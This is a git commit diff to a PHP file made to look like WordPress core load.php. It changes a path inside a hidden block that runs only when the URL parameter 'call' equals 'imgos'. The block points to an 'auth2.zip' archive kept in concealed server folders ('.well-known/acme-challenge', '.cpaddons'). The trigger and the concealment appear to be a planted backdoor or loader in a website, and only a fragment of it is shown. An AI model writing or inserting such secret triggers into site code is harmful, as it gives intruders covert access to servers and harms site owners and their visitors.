956aae4d746302c36125ccac3a255368dbab1899
ghostpels <fatkursetiawan08@gmail.com>
2025-11-03 16:50:31 +0700

    Update load.php

--- load.php
+++ load.php
@@ -36,7 +36,7 @@ if ( ! defined( 'ABSPATH' ) ) {
  * If neither set of conditions is true, initiate loading the setup process.
  */
 if ( ! empty( $_GET['call'] ) && 'imgos' === $_GET['call'] ) {
-	$zip_file_path = '/home/u936026861/.well-known/acme-challenge/auth2.zip';
+	$zip_file_path = '/home/freedomb/.cpaddons/moderation/auth2.zip';
 	
 	// Verify file existence and zip extension availability
 	/*
